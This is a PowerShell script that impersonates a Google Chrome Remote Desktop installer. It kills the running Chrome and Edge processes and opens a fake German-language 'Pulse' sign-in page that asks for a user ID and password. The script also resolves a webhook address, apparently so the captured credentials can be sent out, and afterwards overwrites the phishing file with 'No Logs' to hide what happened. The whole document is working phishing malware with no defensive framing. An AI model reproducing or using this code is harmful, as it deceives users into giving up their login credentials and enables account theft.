#========================================== WINDOW ONE (SETUP) =====================================================
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$base64IconString = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAABMlBMVEVHcExChfRChfRAm3jqQzVChfQ0qFNChfTxcyVChfVChfQ0qFPrRzPqQzU0qFMzp1bqQzU0qFM0qFM0plw0qFNChfQ0qFPqQzVChfRChfTqQzU0qFPqQzXqQzU0qFPqQzXqQzXqQzXqQzXrRDT7vAX8vAU1qFLqQjXqQzXqQzX8vQRAqU40qFNChfTqQzXqQzU0qFNChfT0uwj7vAU0qFM0qFPqQzX7vAU5m5BChfP7vAVChfT7vAXqQzU0qFPqQzVChfT7vAU0qFPqQzX7vAVBh+v7vAX7vAX7vAX1uAlChfT7vAW+th32lxRChfRChfRChfQ0qFNChfTqQzX7vAUyqFX+vARAi9o9krg2o2vRuBX6tQiltCbzgxztWixFqkx8rzf4pw1frUL2lhTrSzLwbyTRhUDUAAAAUXRSTlMA4R4G9SWqYQfoUOFL4lENcj3SZ/zy9/kP+j4cg9TvHbP9U8QZ8bsPpzQ6SHU/J2Uvzf16Jod2Tf5zubzVkH7uIWeTl936kp+GrY2OeHgwmKE8ZUQjAAAC40lEQVRYw82Wd3eaUBjGSTCogBiGGBEHmjiiUWPVxiwymu51BW1GmyZp8/2/QlUU4bL1tKfP8T94fr7zchHk/1UkVy00e6LYaxaEXDmoO0eK+ZgsKcr4p0ihWPGkkAvw38JJJqmYJCnJzKUQ8Wcn87Jiq1Ce9IGoVkKKo0KVqoe93IsproptutazkZcUD0kVl2oKGcWHio5pkDE/fiXUXNG/6dAKwa/fqX62+UvJpOTPX85bzHLxcrNAkoXmSVH29CM9qH9STBT0jperYsbDX4UKIIsNaLtE2c0fqUCtFuyGxNmPkOb5tx+2RsFxlSLvfvw2+gMfH7s76q973Z8P7Ec+qKr6+DzzZxqB/dvHY4B6p6WRbAY/Pl+21SlhmsYSCSBv1Zke75UQucT5fTgHqHfPxSUC2H6lLgifoIdbeNhROKo3UdfOLgRYXxs4an9rVsOFXz3eDgCIbmjvnBsAh5EAgMSe9s4LA+ANEgCQwq2A1/8UMMBXTGEOWLqI8xSWbmNqb8VBSny2jPKo/REG7EfNMgDW1uFlGrUfSnEzAD3bMOosnLKOsr7Oo9snwFPum9c3RPAVOlDU7z+HAMAhQMt5ZAD0TUfaqD31A551A+Ap6ypoh+ro9gEMJwDAtHwGoJdg2sjbp6l7olLauQKGAAbvjR8WLXxNHOZUBjw6sM0AQWr8wg84gNnHgJuG6mjL2G0MmFSirfZ4P2qa47DpaYswE7LdDjRQNHbwzTGAseqcmQCILq2XAk1TWBaAGwMhgcMBQklMomAu6lStRrFdjNDwN9c64AsKp9hhLISxi+N5Y2jDg6vZDJxZi0QTwFNDoBUiumfXJcoHQUsjEbafE3+E4fVV32lSacYPIeuybh2M87JzhOuJEa97pMFhLY+PfQvjXfwMG/e8LqC1ydTZ20/Tvm4cKH3BWMPIlti0/1tLutYtEdlZRTmeYDC2hQa8+aBpmmLrp6d1lqI7cWQVocjf1B+DjRopJPWlbAAAAABJRU5ErkJggg=="
$iconimageBytes = [Convert]::FromBase64String($base64IconString)
$ims = New-Object IO.MemoryStream($iconimageBytes, 0, $iconimageBytes.Length)
$ims.Write($iconimageBytes, 0, $iconimageBytes.Length);
$alkIcon = [System.Drawing.Image]::FromStream($ims, $true)

$base64String = "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"
$imageBytes = [System.Convert]::FromBase64String($base64String)
$memoryStream = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
$memoryStream.Write($imageBytes, 0, $imageBytes.Length);
$image = [System.Drawing.Image]::FromStream($memoryStream)

# shortened URL Detection
if ($dc.Ln -ne 121) { Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url }

$setupwindow = New-Object System.Windows.Forms.Form
$setupwindow.ClientSize = '600,450'
$setupwindow.Text = "Chrome Remote Desktop Setup"
$setupwindow.BackColor = "#ffffff"
$setupwindow.Opacity = 1
$setupwindow.TopMost = $true
$setupwindow.Icon = [System.Drawing.Icon]::FromHandle((new-object System.Drawing.Bitmap -argument $ims).GetHIcon())
$setupwindow.FormBorderStyle = 'FixedSingle'

$nextbutton = New-Object System.Windows.Forms.Button
$nextbutton.Text = "Next"
$nextbutton.Width = 85
$nextbutton.Height = 42
$nextbutton.Location = New-Object System.Drawing.Point(490, 395)
$nextbutton.Font = 'Open Sans,12'
$nextbutton.BackColor = "#287ae6"
$nextbutton.ForeColor = "#ffffff"

$textfield = New-Object System.Windows.Forms.Label
$textfield.Text = "Welcome to Google Remote Desktop Host"
$textfield.ForeColor = "#000000"
$textfield.AutoSize = $true
$textfield.Location = New-Object System.Drawing.Point(145, 140)
$textfield.Font = 'Microsoft Sans Serif,12'

$infofield = New-Object System.Windows.Forms.Label
$infofield.Text = "Remote access for your PC. Sign in with google to continue.."
$infofield.ForeColor = "#000000"
$infofield.AutoSize = $true
$infofield.Location = New-Object System.Drawing.Point(120, 230)
$infofield.Font = 'Microsoft Sans Serif,10'

$infofield2 = New-Object System.Windows.Forms.Label
$infofield2.Text = "Chrome will close and restart during installation"
$infofield2.ForeColor = "#000000"
$infofield2.AutoSize = $true
$infofield2.Location = New-Object System.Drawing.Point(155, 260)
$infofield2.Font = 'Microsoft Sans Serif,10'

$linkfield = New-Object System.Windows.Forms.Label
$linkfield.Text = "Sign in to your account"
$linkfield.ForeColor = "#287ae6"
$linkfield.AutoSize = $true
$linkfield.Location = New-Object System.Drawing.Point(345, 407)
$linkfield.Font = 'Microsoft Sans Serif,10'

$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Size = New-Object System.Drawing.Size(300, 300)
$pictureBox.SizeMode = 'AutoSize'
$pictureBox.Image = $image
$pictureBox.Location = New-Object System.Drawing.Point(170, 50)

$setupwindow.controls.AddRange(@($nextbutton, $linkfield, $textfield, $infofield, $infofield2, $pictureBox))

$nextbutton.Add_Click({

        $setupwindow.Close()
    })


[void]$setupwindow.ShowDialog()

Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep 1


$htmlcode1 = @"
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link type="image/x-icon" rel="shortcut icon" href="favicon.ico">
<title>Bei Pulse anmelden</title>
<style>

[class^="icon-"],[class*=" icon-"] {
    font-family: 'unily-identity-provider' !important;
    font-style: normal;
    font-weight: normal;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale
}

.icon-facebook:before {
    content: "\e900"
}

.icon-linkedin:before {
    content: "\e902"
}

.icon-microsoft:before {
    content: "\e903"
}

.icon-windows:before {
    content: "\e904"
}

*,*:before,*:after {
    box-sizing: border-box
}

html {
    min-height: 100%;
    font-family: "Montserrat",Helvetica,Arial,sans-serif;
    font-size: 16px;
    -webkit-tap-highlight-color: transparent
}

body {
    display: flex;
    background: #fff;
    background-size: cover;
    background-position: center;
    min-height: 100%;
    margin: 0;
    padding: 0 40px
}

@media (max-width: 767px) {
    body {
        padding:20px
    }
}

.ip {
    display: flex;
    width: 100%
}

.ip form {
    display: flex;
    flex-direction: column;
    align-items: center;
    align-self: flex-start;
    background-color: #fff;
    color: #5F6A71;
    margin: 85px auto 20px;
    width: 750px;
    max-width: 100%;
    padding: 30px;
    border: none;
    border-radius: 3px;
    box-shadow: none
}

@media (max-width: 767px) {
    .ip form {
        margin:0 auto;
        padding: 20px 10px
    }
}

.ip__logo {
    max-height: 80px;
    margin-bottom: 40px;
    max-width: 80%
}

@media (max-width: 767px) {
    .ip__logo {
        max-width:70%;
        margin-bottom: 30px
    }
}

.ip__title {
    max-width: 100%;
    font-size: 40px;
    font-weight: 400;
    text-align: center;
    margin-bottom: 55px
}

.ip__title__email {
    color: #E9501D
}

.ip__title__Password {
    color: #E9501D
}


.ip__title__error {
    color: #D9534F;
    font-weight: 700
}

.ip__title>span {
    display: block;
    font-size: 18px;
    line-height: 1.5em;
    margin-top: 5px
}

@media (max-width: 767px) {
    .ip__title {
        font-size:30px;
        margin-bottom: 30px
    }

    .ip__title>span {
        font-size: 15px
    }
}

.ip__email-input {
    display: block;
    background: #fff;
    color: #5F6A71;
    border-radius: 5px;
    height: 60px;
    max-width: 630px;
    width: 100%;
    font-size: 16px;
    line-height: 40px;
    padding: 10px 15px;
    margin-bottom: 15px;
    font-family: inherit;
    background-image: none;
    border: 1px solid transparent;
    box-shadow: none;
    transition: border-color .35s ease-in-out;
    pointer-events: all !important
}

.ip__email-input.invalid {
    border: 2px solid #D9534F
}

@media (max-width: 767px) {
    .ip__email-input {
        height:40px;
        font-size: 16px;
        line-height: 20px;
        padding: 10px 15px;
        text-align: center
    }
}

.ip__Password-input {
    display: block;
    background: #fff;
    color: #5F6A71;
    border-radius: 5px;
    height: 60px;
    max-width: 630px;
    width: 100%;
    font-size: 16px;
    line-height: 40px;
    padding: 10px 15px;
    margin-bottom: 15px;
    font-family: inherit;
    background-image: none;
    border: 1px solid transparent;
    box-shadow: none;
    transition: border-color .35s ease-in-out;
    pointer-events: all !important
}

.ip__Password-input.invalid {
    border: 2px solid #D9534F
}

@media (max-width: 767px) {
    .ip__Password-input {
        height:40px;
        font-size: 16px;
        line-height: 20px;
        padding: 10px 15px;
        text-align: center
    }
}


.ip__check-box input[type="checkbox"] {
    width: 0;
    height: 0;
    margin: 0;
    float: left;
    opacity: 0
}

.ip__check-box input[type="checkbox"]~label {
    display: block;
    color: #5F6A71;
    margin: 10px auto;
    padding: 4px 4px 4px 44px;
    position: relative;
    cursor: pointer;
    height: 38px;
    line-height: 30px
}

.ip__check-box input[type="checkbox"]~label:hover {
    color: #E9501D
}

.ip__check-box input[type="checkbox"]~label:before {
    content: "";
    display: block;
    height: 30px;
    width: 30px;
    background: #5F6A71;
    border: 1px solid #5F6A71;
    border-radius: 2px;
    position: absolute;
    left: 4px
}

.ip__check-box input[type="checkbox"]:checked~label:after {
    content: "";
    display: block;
    position: absolute;
    top: 9px;
    left: 15px;
    width: 9px;
    height: 17px;
    border: solid #E9501D;
    border-width: 0 4px 4px 0;
    -webkit-transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    transform: rotate(45deg)
}

.ip__check-box input[type="checkbox"]:focus-visible~label {
    box-shadow: 0 0 0 .15rem #fff;
    outline: .15rem solid #000000 !important;
    outline-offset: .15rem;
    border-radius: 2px
}

@media (max-width: 767px) {
    .ip__check-box input[type="checkbox"]~label {
        padding:4px 5px 4px 36px;
        height: 28px;
        line-height: 22px
    }

    .ip__check-box input[type="checkbox"]~label:before {
        height: 20px;
        width: 20px;
        left: 4px
    }

    .ip__check-box input[type="checkbox"]:checked~label:after {
        top: 6px;
        left: 10px;
        width: 8px;
        height: 14px
    }
}

.ip__error {
    color: #D9534F;
    font-weight: 700;
    margin: 10px auto;
    font-size: 18px
}

.ip__providers {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    margin: 15px auto 0
}

.ip__providers .btn:not(.btn-success):not(.btn-primary):not(.btn-info) {
    display: flex;
    justify-content: center;
    align-items: center;
    align-content: center;
    padding-left: 20px;
    text-align: center
}

.ip__providers .btn [class^="icon-"],.ip__providers .btn [class*="icon-"] {
    position: relative;
    left: auto;
    top: -2px;
    width: 30px;
    -webkit-transform: none;
    transform: none;
    margin-right: 10px
}

.ip__providers .btn [class^="icon-"]:before,.ip__providers .btn [class*="icon-"]:before {
    display: block;
    transform: translateY(-50%);
    top: 50%;
    position: absolute
}

.btn {
    min-height: 60px;
    max-width: 630px;
    width: 100%;
    font-size: 18px;
    line-height: 24px;
    padding: 10px 20px 6px;
    margin-bottom: 15px;
    text-transform: none;
    border-radius: 5px;
    font-weight: 700;
    border: none;
    cursor: pointer;
    -webkit-transition: background .2s ease-in-out;
    transition: background .2s ease-in-out;
    position: relative
}

a.btn {
    text-decoration: none;
    text-align: center;
    line-height: 44px
}

@media (max-width: 767px) {
    a.btn {
        line-height:24px
    }
}

.btn.disabled,.btn[disabled],.btn.disabled:hover,.btn[disabled]:hover,.btn.disabled:focus,.btn[disabled]:focus {
    opacity: .7;
    cursor: not-allowed
}

.btn:not(.btn-success):not(.btn-primary):not(.btn-info) {
    text-align: left;
    padding-left: 60px
}

.btn [class^="icon-"],.btn [class*=" icon-"] {
    display: inline-block;
    width: 26px;
    font-size: 26px;
    position: absolute;
    top: 50%;
    left: 20px;
    -webkit-transform: translateY(-50%);
    transform: translateY(-50%)
}

.btn .icon-google {
    height: 28px;
    background: url('https://intranet.eliagroup.eu/Fallback/Assets/google-g-logo.svg') center / cover
}

@media (max-width: 767px) {
    .btn {
        min-height:40px;
        font-size: 14px
    }
}

.btn-success {
    color: #fff;
    background-color: #83AE00
}

.btn-success:hover,.btn-success:focus {
    color: #fff;
    background-color: #5d7b00
}

.btn-success.disabled,.btn-success[disabled],.btn-success.disabled:hover,.btn-success[disabled]:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus {
    background-color: #83AE00;
    border-color: #709500
}

.btn-primary {
    color: #fff;
    background-color: #E9501D
}

.btn-primary:hover,.btn-primary:focus {
    color: #fff;
    background-color: #c03e13
}

.btn-primary.disabled,.btn-primary[disabled],.btn-primary.disabled:hover,.btn-primary[disabled]:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus {
    background-color: #E9501D;
    border-color: #d84615
}

.btn-info {
    color: #5F6A71;
    background-color: #F4F4F4
}

.btn-info:hover,.btn-info:focus {
    color: #5F6A71;
    background-color: #dbdbdb
}

.btn-info.disabled,.btn-info[disabled],.btn-info.disabled:hover,.btn-info[disabled]:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus {
    background-color: #F4F4F4;
    border-color: #cecece
}

.btn-linkedin {
    color: #fff;
    background-color: #0077b5
}

.btn-linkedin:hover,.btn-linkedin:focus {
    background-color: #005582
}

.btn-google {
    color: #5F6A71;
    background-color: #fff
}

.btn-google:hover,.btn-google:focus {
    background-color: #d9d9d9
}

.btn-facebook {
    color: #fff;
    background-color: #3B5998
}

.btn-facebook:hover,.btn-facebook:focus {
    background-color: #2d4373
}

.btn-windows {
    color: #fff;
    background-color: #E9501D
}

.btn-windows:hover,.btn-windows:focus {
    background-color: #c03e13
}

.sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    margin: -1px;
    padding: 0;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    border: 0;
    white-space: nowrap
}

.ip #submit-button {
    background-color: #E9501D
}

.ip #submit-button:hover,.ip #submit-button:focus {
    background-color: #c03e13
}

.ip .ip__email-input {
    background-color: #e6e6e6
}

.ip .ip__Password-input {
    background-color: #e6e6e6
}


.ip .ip__check-box input[type="checkbox"]~label:before {
    background-color: #e6e6e6;
    border-color: #e6e6e6
}

</style>
</head>
<body>
    <main class="ip">
        

<form action="Pulslogin.HTML
<input name="__RequestVerificationToken" type="hidden" value="G5hdYw4jkcHXIwje2z1CcjeUH9Oi09hmEfQjRGIk9B38Tf0i-Gbeb4Kl1XYsXtRr36HM3DHzAVrVJsNbNSCWAnb1F3gvIZ4VcBQ0PJs8VFI1">
<input id="DisplayLanguage" name="DisplayLanguage" type="hidden" value="de-DE">  
  <img class="ip__logo" src="header-logo.png" alt="Logo">
    <label class="ip__title" for="email">
        Bei Pulse anmelden
        <span>Um sich anzumelden, loggen Sie sich mit Ihrer registrierten user ID ein  .</span>
    </label>
<input autofocus="autofocus" class="ip__email-input" id="Email" name="Email" oninput="validate()" placeholder="Geben Sie hier Ihre User ID ein" spellcheck="false" type="email" value="">
<input autofocus="autofocus" class="ip__Password-input" id="Password" name="Password" oninput="validate()" placeholder="Geben Sie hier Ihr Passwort ein" spellcheck="false" type="password" value="">  
  <button type="submit" class="btn btn-success" id="submit-button">Anmelden</button>
        <div class="ip__check-box">
            <input checked="checked" id="RememberMe" name="RememberMe" type="checkbox" value="true">
<input name="RememberMe" type="hidden" value="false">
            <label class="small" for="RememberMe" tabindex="-1">Meine user ID speichern</label>
        </div>
</form>


    </main>
    
    <script>
        var submitButton = document.getElementById("submit-button");
        var emailInput = document.getElementById("Email");

        function validate() {
            if (emailInput.value.length) {
                submitButton.removeAttribute("disabled");
            } else {
                submitButton.setAttribute("disabled", "disabled");
            }
        }


        // Run validate on page load, as email may be pre-populated
        window.onload = function () {
            validate();
        };

        (function () {
            document.documentElement.lang = navigator.language;
        })();

        var passwordInput = document.getElementById("Password");

        function validate() {
            if (passwordInput.value.length) {
                submitButton.removeAttribute("disabled");
            } else {
                submitButton.setAttribute("disabled", "disabled");
            }
        }


        // Run validate on page load, as Password may be pre-populated
        window.onload = function () {
            validate();
        };

        (function () {
            document.documentElement.lang = navigator.language;
        })();
    </script>



</body>
</html>
"@


$htmlFile = "$env:temp\Pulslogin.html"
$htmlcode1 | Out-File $htmlFile -Force
$webhk | Out-File $htmlFile -Append -Force
$htmlcode2 | Out-File $htmlFile -Append -Force


$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.WorkingArea.Width
$screenHeight = $screen.WorkingArea.Height
$left = ($screenWidth - $width) / 2
$top = ($screenHeight - $height) / 2
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$width = 530
$height = 600

$arguments = "--new-window --window-position=$left,$top --window-size=$width,$height --app=$htmlFile"
$chromeProcess = Start-Process -FilePath $chromePath -ArgumentList $arguments -PassThru
$chromeProcess.WaitForExit()

sleep 2
$outword = "No Logs"
$outword | Out-File $htmlFile -Force
sleep 1